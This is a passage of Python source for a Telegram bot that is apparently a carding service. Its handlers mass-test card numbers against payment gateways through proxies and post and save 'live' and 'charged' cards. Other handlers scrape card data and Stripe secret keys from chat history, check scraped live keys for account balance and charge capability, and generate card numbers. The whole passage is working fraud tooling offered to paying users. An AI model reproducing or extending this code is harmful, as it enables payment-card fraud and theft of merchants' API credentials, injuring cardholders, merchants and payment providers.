        valid_cards.append((cc, mm, yy, cvv))

    for card_data in valid_cards:
        await card_queue.put(card_data)

    if checked_count > 0:
        try:
            await progress_msg.edit(
                make_progress_text(checked_count, total, charged_count, approved_count, declined_count, error_count, tds_count, insf_count, f"Filtered: {checked_count} invalid"),
                buttons=stop_buttons,
            )
        except Exception:
            pass

    async def update_progress():
        now = time.time()
        if now - last_update_time[0] < 2:
            return
        last_update_time[0] = now
        try:
            await progress_msg.edit(
                make_progress_text(checked_count, total, charged_count, approved_count, declined_count, error_count, tds_count, insf_count),
                buttons=stop_buttons,
            )
        except Exception:
            pass

    async def worker():
        nonlocal charged_count, approved_count, declined_count, error_count, checked_count, tds_count, insf_count

        while not stop_event.is_set():
            if user_id not in ACTIVE_MASS_PROCESSES:
                stop_event.set()
                break

            try:
                cc, mm, yy, cvv = card_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            resp = None
            try:
                async with GLOBAL_MASS_SEM:
                    mass_timeout = 55 if alias in ("ppn", "pp", "ch", "shp", "bnc", "ppk") else 40
                    resp = await asyncio.wait_for(
                        run_gateway(alias, cc, mm, yy, cvv, user_id=user_id, is_admin=user_id in ADMIN_ID),
                        timeout=mass_timeout
                    )
                if resp == "NO_SKOOL_ACCOUNT":
                    stop_event.set()
                    try:
                        await event.reply(NO_SKOOL_ACCOUNT_MSG)
                    except: pass
                    break
                resp = resp or "No response"
            except asyncio.TimeoutError:
                _proxy_set = bool(get_user_proxy(user_id))
                if _proxy_set:
                    resp = "Error - Gateway Timeout\n⚠️ Your proxy may be dead — update it with /setproxy"
                else:
                    resp = "Error - Gateway Timeout\n⚠️ No proxy set — add one with /setproxy to avoid timeouts"
            except Exception as ex:
                resp = f"Error - {str(ex)[:80]}"

            if stop_event.is_set():
                break

            resp_clean = clean_response(resp)
            status = classify_response(resp)

            resp_lower = resp_clean.lower() if resp_clean else ""
            is_3ds = "3ds" in resp_lower or "3d secure" in resp_lower or "requires_action" in resp_lower
            is_insf = "insufficient" in resp_lower

            async with results_lock:
                checked_count += 1

                if status == "CHARGED":
                    charged_count += 1
                    consecutive_errors[0] = 0
                    hits.append((cc, mm, yy, cvv, "CHARGED", resp_clean))
                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", resp_clean))
                elif status == "APPROVED":
                    approved_count += 1
                    consecutive_errors[0] = 0
                    if is_3ds:
                        tds_count += 1
                    if is_insf:
                        insf_count += 1
                    hits.append((cc, mm, yy, cvv, "APPROVED", resp_clean))
                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", resp_clean))
                elif status == "DECLINED":
                    declined_count += 1
                    consecutive_errors[0] = 0
                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", resp_clean))
                else:
                    error_count += 1
                    consecutive_errors[0] += 1
                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "ERROR", resp_clean))

                    if consecutive_errors[0] >= 20:
                        try:
                            await event.reply(
                                f"\u26a0 **{consecutive_errors[0]} consecutive errors detected.**\n"
                                f"All workers pausing 60s...\n"
                                f"Last error: {resp_clean[:100]}"
                            )
                        except Exception:
                            pass
                        consecutive_errors[0] = 0
                        await asyncio.sleep(30)
                    elif consecutive_errors[0] >= 10:
                        await asyncio.sleep(5)

                if checked_count % 100 == 0:
                    try:
                        progress_file = os.path.join(tempfile.gettempdir(), f"progress_{alias}_{user_id}.txt")
                        start_idx = max(0, len(all_results) - 100)
                        new_entries = all_results[start_idx:]
                        mode = "a" if os.path.exists(progress_file) else "w"
                        with open(progress_file, mode) as pf:
                            if mode == "w":
                                pf.write(f"Mass Check Progress - {gate_name}\n")
                                pf.write("=" * 50 + "\n")
                            pf.write(f"--- Progress: {checked_count}/{total} | C:{charged_count} A:{approved_count} D:{declined_count} E:{error_count} ---\n")
                            for card_str, card_status, card_resp in new_entries:
                                pf.write(f"{card_str} | {card_status} | {card_resp}\n")
                    except Exception:
                        pass

            if status == "CHARGED":
                try:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
                    mass_proxy = get_user_proxy(user_id)
                    mp_status = "Live" if mass_proxy else "Not Set"
                    hit_msg = format_gateway_result(
                        "CHARGED", cc, mm, yy, cvv, gate_name, resp,
                        brand, bin_type, level, bank, country, flag,
                        0, first_name, user_id, rank, proxy_status=mp_status
                    )
                    result_msg = await event.reply(hit_msg)
                    await pin_charged_message(event, result_msg)
                    if event.is_group:
                        asyncio.create_task(auto_delete_message(result_msg))
                    await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", resp, gate_name, "-", user_id, first_name)
                    asyncio.create_task(asyncio.to_thread(
                        send_bot_group_log, first_name, user_id,
                        f"{cc}|{mm}|{yy}|{cvv}", gate_name, resp, "CHARGED"
                    ))
                except Exception:
                    try:
                        await event.reply(f"\U0001f525 **CHARGED** `{cc}|{mm}|{yy}|{cvv}`")
                    except Exception:
                        pass
            elif status == "APPROVED":
                try:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
                    mass_proxy = get_user_proxy(user_id)
                    mp_status = "Live" if mass_proxy else "Not Set"
                    hit_msg = format_gateway_result(
                        "APPROVED", cc, mm, yy, cvv, gate_name, resp,
                        brand, bin_type, level, bank, country, flag,
                        0, first_name, user_id, rank, proxy_status=mp_status
                    )
                    approved_msg = await event.reply(hit_msg)
                    if event.is_group:
                        asyncio.create_task(auto_delete_message(approved_msg))
                    await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", resp, gate_name, "-", user_id, first_name)
                except Exception:
                    try:
                        await event.reply(f"\u2705 **APPROVED** `{cc}|{mm}|{yy}|{cvv}`")
                    except Exception:
                        pass

            await update_progress()
            card_queue.task_done()

    try:
        worker_tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
        await asyncio.gather(*worker_tasks)

        stopped = user_id not in ACTIVE_MASS_PROCESSES and checked_count < total
        status_label = "Stopped" if stopped else "Complete"
        bar = _progress_bar(checked_count, total)
        pct = f"{(checked_count / total * 100):.1f}" if total > 0 else "100.0"
        final_proxy = get_user_proxy(user_id)
        final_p_status = "Live" if final_proxy else "Not Set"
        final_elapsed = _fmt_elapsed()
        final_text = (
            f"\u2714 **Mass Check {status_label} - {gate_name}**\n{sep}\n"
            f"{bar} **{pct}%**\n"
            f"Total: {total} | Workers: {concurrency}\n"
            f"\u23f1 Time: {final_elapsed}\n\n"
            f"\U0001f525 Charged: {charged_count}\n"
            f"\u2705 Approved: {approved_count}\n"
            f"\U0001f512 3DS: {tds_count}\n"
            f"\U0001f4b3 Insufficient: {insf_count}\n"
            f"\u274c Declined: {declined_count}\n"
            f"\u26a0 Errors: {error_count}\n\n"
            f"\U0001f464 Req By \u00bb [{first_name}](tg://user?id={user_id}) [{rank}]\n"
            f"\U0001f310 Proxy \u00bb {final_p_status}"
        )
        if skool_tip:
            final_text += skool_tip
        if hits and alias not in ("skl", "skl1", "skl2", "auto"):
            sorted_hits = sorted(hits, key=lambda h: (0 if h[4] == "CHARGED" else 1))
            final_text += f"\n\n**Live Cards ({len(sorted_hits)}):**\n"
            for h_cc, h_mm, h_yy, h_cvv, h_status, _ in sorted_hits:
                icon = "\U0001f525" if h_status == "CHARGED" else "\u2705"
                final_text += f"{icon} `{h_cc}|{h_mm}|{h_yy}|{h_cvv}`\n"
        try:
            await progress_msg.edit(final_text, buttons=None)
            if event.is_group:
                asyncio.create_task(auto_delete_message(progress_msg))
        except Exception:
            fallback_msg = await event.reply(final_text)
            if event.is_group:
                asyncio.create_task(auto_delete_message(fallback_msg))

        result_file = os.path.join(tempfile.gettempdir(), f"results_{alias}_{user_id}.txt")
        try:
            status_order = {"CHARGED": 0, "APPROVED": 1, "DECLINED": 2, "ERROR": 3}
            sorted_results = sorted(all_results, key=lambda r: status_order.get(r[1], 4))
            with open(result_file, "w") as rf:
                rf.write(f"Mass Check Results - {gate_name}\n")
                rf.write(f"Total: {total} | Charged: {charged_count} | Approved: {approved_count} | Declined: {declined_count} | Errors: {error_count}\n")
                rf.write("=" * 50 + "\n\n")
                for card_str, card_status, card_resp in sorted_results:
                    rf.write(f"{card_str} | {card_status} | {card_resp}\n")
            file_msg = await event.reply(file=result_file)
            if event.is_group:
                asyncio.create_task(auto_delete_message(file_msg))
            os.remove(result_file)
        except Exception:
            pass

        progress_file = os.path.join(tempfile.gettempdir(), f"progress_{alias}_{user_id}.txt")
        try:
            if os.path.exists(progress_file):
                os.remove(progress_file)
        except Exception:
            pass

    except Exception as e:
        try:
            await event.reply(f"Mass check error: {e}")
        except Exception:
            pass
        if all_results:
            try:
                crash_file = os.path.join(tempfile.gettempdir(), f"partial_results_{alias}_{user_id}.txt")
                with open(crash_file, "w") as cf:
                    cf.write(f"Mass Check PARTIAL Results (crashed) - {gate_name}\n")
                    cf.write(f"Checked: {len(all_results)}/{total} | Charged: {charged_count} | Approved: {approved_count} | Declined: {declined_count} | Errors: {error_count}\n")
                    cf.write("=" * 50 + "\n\n")
                    for card_str, card_status, card_resp in all_results:
                        cf.write(f"{card_str} | {card_status} | {card_resp}\n")
                await event.reply(f"\u26a0 Mass check crashed. Sending partial results ({len(all_results)}/{total} cards)...", file=crash_file)
                os.remove(crash_file)
            except Exception:
                pass
    finally:
        ACTIVE_MASS_PROCESSES.pop(user_id, None)
        await unregister_mass_user(user_id)
        if alias in ("skl", "skl1", "skl2", "auto"):
            try:
                await reset_all_clients()
            except Exception:
                pass

# --- /txt Handler (Extract CCs from replied message and send as .txt) ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]txt$'))
async def txt_extract_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    if not event.reply_to_msg_id:
        return await event.reply("Reply to a message containing CCs with `/txt` to extract them as a `.txt` file.")

    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.text:
        return await event.reply("The replied message has no text content.")

    cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
    found_cards = cc_pattern.findall(replied_msg.text)

    if not found_cards:
        return await event.reply("No valid CCs found in the replied message.\n**Format:** `card|mm|yy|cvv`")

    seen = set()
    unique_cards = []
    for c in found_cards:
        if c not in seen:
            seen.add(c)
            unique_cards.append(c)

    content = "\n".join(unique_cards)
    file_bytes = content.encode("utf-8")

    import io
    file = io.BytesIO(file_bytes)
    file.name = f"extracted_{len(unique_cards)}ccs.txt"

    await event.reply(
        f"**Extracted {len(unique_cards)} CCs** from replied message.",
        file=file
    )


# --- /scr Handler (CC Scraper from current chat) ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]scr(\s|$)'))
async def scr_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        msg, buttons = access_denied_message_with_button()
        return await event.reply(msg, buttons=buttons)

    args = event.raw_text.split()
    limit = 100
    if len(args) >= 2:
        try:
            limit = int(args[1])
            if limit < 1:
                limit = 1
            elif limit > 500:
                limit = 500
        except ValueError:
            return await event.reply("**Usage:** `/scr [limit]`\nExample: `/scr 200`\nDefault: 100 messages, max 500")

    await register_user(event.sender_id)
    loading_msg = await event.reply(f"\u25e0 Scraping CCs from last {limit} messages...")

    try:
        cc_pattern = re.compile(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
        found = set()
        count = 0
        async for msg in client.iter_messages(event.chat_id, limit=limit):
            count += 1
            if msg.text:
                matches = cc_pattern.findall(msg.text)
                for m in matches:
                    found.add(m)

        await loading_msg.delete()

        if not found:
            return await event.reply(
                f"**CC Scraper**\n\n"
                f"Messages scanned: `{count}`\n"
                f"CCs found: `0`\n\n"
                f"No CCs found in the last {limit} messages."
            )

        results = list(found)
        results_text = "\n".join(results)

        if len(results) > 50:
            import io
            file_content = results_text.encode("utf-8")
            buf = io.BytesIO(file_content)
            buf.name = f"ccs_{len(results)}.txt"
            await event.reply(
                f"**CC Scraper \u2705**\n\n"
                f"\U0001f4e8 Messages scanned: `{count}`\n"
                f"\U0001f4b3 Unique CCs found: `{len(results)}`",
                file=buf,
            )
        else:
            await event.reply(
                f"**CC Scraper \u2705**\n\n"
                f"\U0001f4e8 Messages scanned: `{count}`\n"
                f"\U0001f4b3 Unique CCs found: `{len(results)}`\n\n"
                f"`{results_text}`"
            )
    except Exception as e:
        try:
            await loading_msg.delete()
        except:
            pass
        await event.reply(f"Error scraping: {e}")

# --- /scrsk Handler (SK Scraper from current chat) ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]scrsk(\s|$)'))
async def scrsk_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        msg, buttons = access_denied_message_with_button()
        return await event.reply(msg, buttons=buttons)

    args = event.raw_text.split()
    limit = 100
    if len(args) >= 2:
        try:
            limit = int(args[1])
            if limit < 1:
                limit = 1
            elif limit > 500:
                limit = 500
        except ValueError:
            return await event.reply("**Usage:** `/scrsk [limit]`\nExample: `/scrsk 200`\nDefault: 100 messages, max 500")

    await register_user(event.sender_id)
    loading_msg = await event.reply(f"\u25e0 Scraping SKs from last {limit} messages...")

    try:
        sk_pattern = re.compile(r'sk_(live|test)_[a-zA-Z0-9]{20,}')
        found = set()
        count = 0
        async for msg in client.iter_messages(event.chat_id, limit=limit):
            count += 1
            if msg.text:
                for m in sk_pattern.finditer(msg.text):
                    found.add(m.group())

        await loading_msg.delete()

        if not found:
            return await event.reply(
                f"**SK Scraper**\n\n"
                f"Messages scanned: `{count}`\n"
                f"SKs found: `0`\n\n"
                f"No SKs found in the last {limit} messages."
            )

        results = list(found)
        results_text = "\n".join(results)

        if len(results) > 50:
            import io
            file_content = results_text.encode("utf-8")
            buf = io.BytesIO(file_content)
            buf.name = f"sks_{len(results)}.txt"
            await event.reply(
                f"**SK Scraper \U0001f511**\n\n"
                f"\U0001f4e8 Messages scanned: `{count}`\n"
                f"\U0001f511 Unique SKs found: `{len(results)}`",
                file=buf,
            )
        else:
            await event.reply(
                f"**SK Scraper \U0001f511**\n\n"
                f"\U0001f4e8 Messages scanned: `{count}`\n"
                f"\U0001f511 Unique SKs found: `{len(results)}`\n\n"
                f"`{results_text}`"
            )
    except Exception as e:
        try:
            await loading_msg.delete()
        except:
            pass
        await event.reply(f"Error scraping: {e}")

# --- /sh Handler (Shopify + Gateway routing) ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]sh\b'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        msg, buttons = access_denied_message_with_button()
        return await event.reply(msg, buttons=buttons)
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    args = event.raw_text.split()
    flat = get_flat_registry()

    if len(args) >= 2 and args[1].lower() in flat:
        alias = args[1].lower()

        if not is_gateway_on(alias) and event.sender_id not in ADMIN_ID:
            return await event.reply(f"Gateway `{alias}` is currently disabled by admin.")

        allowed, remaining = check_cooldown(event.sender_id)
        if not allowed:
            return await event.reply(f"Cooldown: wait {remaining}s")

        remaining_text = " ".join(args[2:]) if len(args) > 2 else ""
        card_data = None
        if remaining_text:
            card_data = parse_card_input(remaining_text)
        if not card_data and event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.text:
                card_data = parse_card_input(replied_msg.text)
                if not card_data:
                    cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
                    found_in_reply = cc_pattern.findall(replied_msg.text)
                    if found_in_reply:
                        card_data = parse_card_input(found_in_reply[0])
        if not card_data:
            return await event.reply(f"**Format:** `/sh {alias} 4111111111111111|12|25|123`")

        cc, mm, yy, cvv = card_data
        if not checkLuhn(cc):
            return await event.reply("Invalid card number (Luhn check failed).")
        if is_bin_banned(cc):
            return await event.reply("This BIN is banned.")

        user = await event.get_sender()
        first_name = user.first_name or "User"
        rank = await get_user_rank(event.sender_id)
        gate_name = flat[alias]["name"]

        loading_msg = await event.reply(f"\u25e0 Checking on **{gate_name}**...")
        start_time = time.time()

        async def animate_sh_loading():
            spinner = ["\u25dc", "\u25dd", "\u25de", "\u25df"]
            dots = ["", ".", "..", "..."]
            i = 0
            while True:
                try:
                    s = spinner[i % 4]
                    d = dots[i % 4]
                    await loading_msg.edit(f"{s} Checking on **{gate_name}**{d}")
                    await asyncio.sleep(0.6)
                    i += 1
                except:
                    break

        sh_loading_task = asyncio.create_task(animate_sh_loading())

        try:
            response = await run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID)
            if response == "NO_SKOOL_ACCOUNT":
                sh_loading_task.cancel()
                try: await loading_msg.delete()
                except: pass
                await event.reply(NO_SKOOL_ACCOUNT_MSG)
                return
            elapsed = round(time.time() - start_time, 2)
            status = classify_response(response)
            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)

            if status == "CHARGED":
                status_header = "CHARGED"
                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", response, gate_name, "-", event.sender_id, first_name)
            elif status == "APPROVED":
                status_header = "APPROVED"
                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", response, gate_name, "-", event.sender_id, first_name)
            elif status == "DECLINED":
                status_header = "DECLINED"
            else:
                status_header = "UNKNOWN"

            user_proxy = get_user_proxy(event.sender_id)
            if not user_proxy:
                p_status = "Not Set"
            elif status in ("CHARGED", "APPROVED", "DECLINED"):
                p_status = "Live"
            else:
                p_status = "Dead"
            msg = format_gateway_result(
                status_header, cc, mm, yy, cvv, gate_name, response,
                brand, bin_type, level, bank, country, flag,
                elapsed, first_name, event.sender_id, rank, proxy_status=p_status
            )

            sh_loading_task.cancel()
            await loading_msg.delete()
            result_msg = await event.reply(msg)
            if status == "CHARGED":
                await pin_charged_message(event, result_msg)
            if event.is_group:
                asyncio.create_task(auto_delete_message(result_msg))
        except Exception as e:
            sh_loading_task.cancel()
            try: await loading_msg.delete()
            except: pass
            await event.reply(f"Error: {e}")
        return

    return await event.reply("**Format:** `/sh <alias> <cc>`\n\nUse `/cmds` to see available gateways")

@client.on(events.NewMessage(pattern=r'(?i)^[/]fl\b'))
async def fl_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"

    raw_text = ""
    parts = event.raw_text.split(None, 1)
    if len(parts) >= 2:
        raw_text += parts[1].strip()

    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg:
            if replied_msg.document:
                fname = ""
                for attr in getattr(replied_msg.document, 'attributes', []):
                    if hasattr(attr, 'file_name'):
                        fname = attr.file_name
                        break
                if fname.lower().endswith('.txt'):
                    try:
                        file_data = await replied_msg.download_media(bytes)
                        raw_text += "\n" + file_data.decode("utf-8", errors="ignore")
                    except Exception as e:
                        return await event.reply(f"Error reading file: {e}")
                else:
                    return await event.reply("Please reply to a `.txt` file.")
            elif replied_msg.text:
                raw_text += "\n" + replied_msg.text

    if not raw_text.strip():
        sep = "\u2500" * 24
        return await event.reply(
            f"\U0001f4e4 **CC Extractor**\n{sep}\n\n"
            f"**Usage:**\n"
            f"\u25cf `/fl <paste CCs here>`\n"
            f"\u25cf Reply to a `.txt` file with `/fl`\n"
            f"\u25cf Reply to any message with `/fl`\n\n"
            f"**Supported Formats:**\n"
            f"`4111111111111111|01|25|123`\n"
            f"`4111111111111111/01/25/123`\n"
            f"`4111111111111111:01:25:123`\n"
            f"`4111 1111 1111 1111 01/25 123`\n\n"
            f"Extracts all valid CCs and outputs them in `pipe` format."
        )

    card_pattern = re.compile(r'(\d{13,19})[|/;:,\s]+(\d{1,2})[|/;:,\s]+(\d{2,4})[|/;:,\s]+(\d{3,4})')
    found = card_pattern.findall(raw_text)

    seen = set()
    cards = []
    for cc, mm, yy, cvv in found:
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        key = f"{cc}|{mm}|{yy}|{cvv}"
        if key not in seen:
            seen.add(key)
            cards.append(key)

    if not cards:
        return await event.reply("\u274c No valid CCs found in the provided text/file.")

    sep = "\u2500" * 24

    if len(cards) <= 30:
        card_list = "\n".join([f"`{c}`" for c in cards])
        return await event.reply(
            f"\U0001f4e4 **CC Extractor**\n{sep}\n\n"
            f"\U0001f4b3 **Found:** `{len(cards)}` CCs\n"
            f"\U0001f464 **User:** {first_name}\n\n"
            f"{card_list}"
        )
    else:
        card_text = "\n".join(cards)
        file_path = os.path.join(tempfile.gettempdir(), f"extracted_{event.sender_id}_{int(time.time())}.txt")
        async with aiofiles.open(file_path, "w") as f:
            await f.write(card_text)
        await event.reply(
            f"\U0001f4e4 **CC Extractor**\n{sep}\n\n"
            f"\U0001f4b3 **Found:** `{len(cards)}` CCs\n"
            f"\U0001f464 **User:** {first_name}\n\n"
            f"Too many to display inline \u2014 sent as file.",
            file=file_path
        )
        try:
            os.remove(file_path)
        except:
            pass


# --- Tool Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/]gen'))
async def gen_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    tool_ok, tool_msg = await check_tool_access("gen", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)
    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    result = await tool_gen(event.raw_text, event.sender_id, first_name, rank)
    if isinstance(result, dict):
        await event.reply(result["text"], file=result["file"])
        try:
            os.remove(result["file"])
        except Exception:
            pass
    else:
        await event.reply(result)

@client.on(events.NewMessage(pattern=r'(?i)^[/]bin'))
async def bin_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    tool_ok, tool_msg = await check_tool_access("bin", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)
    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    result = await tool_bin(event.raw_text, event.sender_id, first_name, rank)
    await event.reply(result)

ACTIVE_SKC_PROCESSES = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/]skc\b'))
async def skc_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    tool_ok, tool_msg = await check_tool_access("skc", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)

    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"
    user_id = event.sender_id

    if user_id in ACTIVE_SKC_PROCESSES:
        return await event.reply("You already have an SK check running. Wait for it to finish.")

    raw_keys = ""
    parts = event.raw_text.split(None, 1)
    if len(parts) >= 2:
        raw_keys += parts[1].strip()

    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg:
            if replied_msg.document:
                fname = ""
                for attr in getattr(replied_msg.document, 'attributes', []):
                    if hasattr(attr, 'file_name'):
                        fname = attr.file_name
                        break
                if fname.lower().endswith('.txt'):
                    try:
                        file_data = await replied_msg.download_media(bytes)
                        raw_keys += "\n" + file_data.decode("utf-8", errors="ignore")
                    except Exception as e:
                        return await event.reply(f"Error reading file: {e}")
                else:
                    return await event.reply("Please reply to a `.txt` file.")
            elif replied_msg.text:
                raw_keys += "\n" + replied_msg.text

    sk_pattern = re.compile(r'(sk_live_[a-zA-Z0-9]{20,})')
    found_keys = list(set(sk_pattern.findall(raw_keys)))

    if not found_keys:
        sep = "\u2500" * 24
        return await event.reply(
            f"\U0001f50d **Mass SK Checker**\n{sep}\n\n"
            f"**Usage:**\n"
            f"\u25cf `/skc sk_live_xxx sk_live_yyy`\n"
            f"\u25cf Reply to a `.txt` file with `/skc`\n"
            f"\u25cf Reply to any message with `/skc`\n\n"
            f"Checks multiple Stripe secret keys at once."
        )

    if len(found_keys) > 50:
        found_keys = found_keys[:50]
        await event.reply(f"Found {len(found_keys)}+ keys. Checking first 50.")

    ACTIVE_SKC_PROCESSES[user_id] = True
    asyncio.create_task(_process_sk_keys(event, found_keys, first_name, user_id))


async def _process_sk_keys(event, keys, first_name, user_id):
    from gates.sk_checker import sk_key_check

    sep = "\u2500" * 24
    total = len(keys)
    live_keys = []
    dead_keys = []
    checked = 0

    status_msg = await event.reply(
        f"\U0001f50d **Mass SK Checker**\n{sep}\n\n"
        f"Checking `{total}` keys...\n"
        f"\u23f3 Progress: `0/{total}`"
    )

    CONCURRENT = 5

    async def check_one(sk):
        nonlocal checked
        result = await sk_key_check(sk)
        checked += 1
        return sk, result

    sem = asyncio.Semaphore(CONCURRENT)

    async def limited_check(sk):
        async with sem:
            return await check_one(sk)

    try:
        tasks = [asyncio.create_task(limited_check(sk)) for sk in keys]

        last_edit = 0
        for coro in asyncio.as_completed(tasks):
            sk, result = await coro
            if result["status"] == "live":
                live_keys.append((sk, result))
            else:
                dead_keys.append((sk, result))

            now = time.time()
            if now - last_edit > 3 and checked < total:
                last_edit = now
                try:
                    await status_msg.edit(
                        f"\U0001f50d **Mass SK Checker**\n{sep}\n\n"
                        f"Checking `{total}` keys...\n"
                        f"\u23f3 Progress: `{checked}/{total}`\n"
                        f"\u2705 Live: `{len(live_keys)}` | \u274c Dead: `{len(dead_keys)}`"
                    )
                except Exception:
                    pass

        result_text = f"\U0001f50d **Mass SK Checker**\n{sep}\n\n"
        result_text += f"\U0001f464 **User:** {first_name}\n"
        result_text += f"\U0001f4ca **Total:** `{total}` | \u2705 Live: `{len(live_keys)}` | \u274c Dead: `{len(dead_keys)}`\n\n"

        if live_keys:
            result_text += f"\u2705 **LIVE KEYS:**\n"
            for sk, info in live_keys:
                sk_short = f"{sk[:15]}...{sk[-8:]}"
                bal = info.get("available", "?")
                pnd = info.get("pending", "?")
                cur = info.get("currency", "?")
                country = info.get("country", "?")
                charges = "\u2705" if info.get("charges_enabled") else "\u274c"
                biz = info.get("business_name", "N/A")
                result_text += (
                    f"\n`{sk}`\n"
                    f"  Balance: `{bal}` | Pending: `{pnd}`\n"
                    f"  Currency: `{cur}` | Country: `{country}`\n"
                    f"  Charges: {charges} | Business: `{biz}`\n"
                )

        if dead_keys and len(dead_keys) <= 10:
            result_text += f"\n\u274c **DEAD KEYS:**\n"
            for sk, info in dead_keys:
                sk_short = f"{sk[:15]}...{sk[-8:]}"
                result_text += f"`{sk_short}` - {info.get('message', 'Dead')}\n"
        elif dead_keys:
            result_text += f"\n\u274c **{len(dead_keys)} dead keys** (not shown)\n"

        try:
            await status_msg.edit(result_text)
        except Exception:
            await event.reply(result_text)

        if live_keys:
            live_text = "\n".join([sk for sk, _ in live_keys])
            file_path = os.path.join(tempfile.gettempdir(), f"live_sk_{user_id}_{int(time.time())}.txt")
            async with aiofiles.open(file_path, "w") as f:
                await f.write(live_text)
            await event.reply(f"\u2705 **{len(live_keys)} Live SK keys** saved to file:", file=file_path)
            try:
                os.remove(file_path)
            except:
                pass

    except Exception as e:
        await event.reply(f"Error during SK check: {str(e)[:100]}")
    finally:
        ACTIVE_SKC_PROCESSES.pop(user_id, None)


@client.on(events.NewMessage(pattern=r'(?i)^[/]sk(\s|$)'))
async def sk_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    tool_ok, tool_msg = await check_tool_access("sk", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)
    await register_user(event.sender_id)
    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    result = await tool_sk(event.raw_text, event.sender_id, first_name, rank)
    await event.reply(result)

@client.on(events.NewMessage(pattern=r'(?i)^[/](id|me)$'))
async def id_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    await register_user(event.sender_id)

    is_reply = False
    target_user = await event.get_sender()
    target_user_id = event.sender_id

    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.sender:
            target_user = replied_msg.sender
            target_user_id = target_user.id
            is_reply = True

    first_name = target_user.first_name or "N/A"
    username = target_user.username or None
    rank = await get_user_rank(target_user_id)

    expiry = None
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(target_user_id))
    if user_data:
        expiry = user_data.get('expiry', None)

    result = await tool_id(target_user_id, first_name, username, event.chat_id, rank, expiry, is_reply)
    await event.reply(result)

@client.on(events.NewMessage(pattern=r'(?i)^[/]ping$'))
async def ping_handler(event):
    await register_user(event.sender_id)
    start_time = time.time()
    msg = await event.reply("Pong!")
    elapsed = round((time.time() - start_time) * 1000, 2)
    await msg.edit(f"**Pong!**\nLatency: `{elapsed}ms`\nBot: {BOT_USERNAME or ADMIN_USERNAME}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]rand'))
async def rand_handler(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
